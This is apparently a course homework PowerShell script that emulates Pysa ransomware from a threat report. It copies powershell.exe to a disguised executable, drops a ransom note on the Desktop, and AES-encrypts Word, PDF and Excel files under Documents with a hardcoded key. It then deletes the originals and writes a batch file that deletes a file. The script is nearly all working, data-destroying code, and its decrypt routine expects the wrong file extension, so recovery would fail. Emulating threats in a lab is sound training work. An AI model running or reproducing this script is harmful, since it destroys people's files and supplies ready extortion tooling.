# Create the file using info from the threat report
$num = Get-Random -Minimum 1000 -Maximum 9876
$fileName = "\EnNoB-$num.exe"
$dir = "$env:USERPROFILE"
$fullPath = $dir+$fileName
Copy-Item -Path "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" -Destination $fullPath

# Check if the file already exists
if ( Test-Path $fullPath ) {
    Write-Host -BackgroundColor "Green" -ForegroundColor "White" "File '$fullPath' was found"
} else {
    Write-Host -BackgroundColor "Red" -ForegroundColor "White" "File '$fullPath' was NOT found"
}

# Add README file to Desktop
$readLocation = $dir + "\Desktop\README.READ"
$msg = "If you want your files restored, please contact me at test@email.com. I look forward to doing business with you."
$msg | Out-File -FilePath $readLocation 

# Check if README file exists
if ( Test-Path $readLocation ) {
    Write-Host -BackgroundColor "Green" -ForegroundColor "White" "File '$readLocation' was found"
} else {
    Write-Host -BackgroundColor "Red" -ForegroundColor "White" "File '$readLocation' was NOT found"
}

# Code added from week 13
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".pysa"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}

# List all files and print the full path
#Get-ChildItem -Recurse -Include *.docx,*.pdf,*.txt .\Documents | Select FullName

# Export files to a CSV
Get-ChildItem -Recurse -Include *.docx,*.pdf,*.xlsx .\Documents | Export-Csv -Path files.csv

# Import CSV file
$fileList = Import-Csv -Path .\files.csv -Header FullName

# Loop through the results
foreach ($f in $fileList) {
    #Get-ChildItem -Path $f.FullName
    # Encrypt files
    Invoke-AESEncryption -Mode Encrypt -Key "password" -Path $f.FullName
    # Delete the original non-encrypted file, keeping only the encrypted one
    Remove-Item $f.FullName
}


# Create file called "update.bat" to delete step2.ps1
$rmFile = "test.txt"
$rmDir = "C:\Users\colec\Desktop\SYS320\Week13\homework\"
$contents = "del $rmDir$rmFile"
New-Item "C:\Users\colec\Desktop\SYS320\Week13\homework\update1.bat" -ItemType File -Value "$contents"